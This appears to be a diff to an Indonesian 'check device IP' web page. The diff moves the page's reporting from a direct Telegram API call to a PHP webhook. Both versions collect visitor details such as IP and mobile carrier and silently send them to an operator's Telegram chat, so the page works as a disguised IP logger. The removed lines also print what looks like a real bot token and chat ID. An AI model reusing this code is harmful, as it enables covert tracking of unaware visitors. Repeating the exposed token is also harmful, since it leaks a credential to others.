@@ -4,30 +4,13 @@
   <title>Cek IP Perangkat</title>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script>
-    // Fungsi untuk mengirim pesan ke bot Telegram
+    // Fungsi untuk mengirim pesan ke bot Telegram melalui webhook PHP
     function sendMessageToTelegram(message) {
-      var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
-      var chatId = '1121369247';
-
-      // Buat URL untuk mengirim pesan menggunakan bot Telegram
-      var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
-      var data = {
-        chat_id: chatId,
-        text: message
-      };
-
-      // Kirim permintaan POST ke API Telegram menggunakan metode JSONP
-      $.ajax({
-        url: url,
-        type: 'POST',
-        data: data,
-        dataType: 'jsonp',
-        success: function(response) {
-          console.log('Pesan berhasil dikirim ke Telegram');
-        },
-        error: function(error) {
-          console.error('Terjadi kesalahan saat mengirim pesan ke Telegram:', error);
-        }
+      // Kirim permintaan POST ke file PHP yang akan mengirimkan pesan ke bot Telegram
+      $.post('telegram_send.php', { message: message }, function(response) {
+        console.log('Pesan berhasil dikirim ke Telegram');
+      }).fail(function(error) {
+        console.error('Terjadi kesalahan saat mengirim pesan ke Telegram:', error);
       });
     }
 
@@ -59,7 +42,7 @@
           Mobile Carrier: ${mobileCarrier}
         `;
 
-        // Kirim pesan ke bot Telegram
+        // Kirim pesan ke bot Telegram melalui webhook PHP
         sendMessageToTelegram(message);
       });
     }
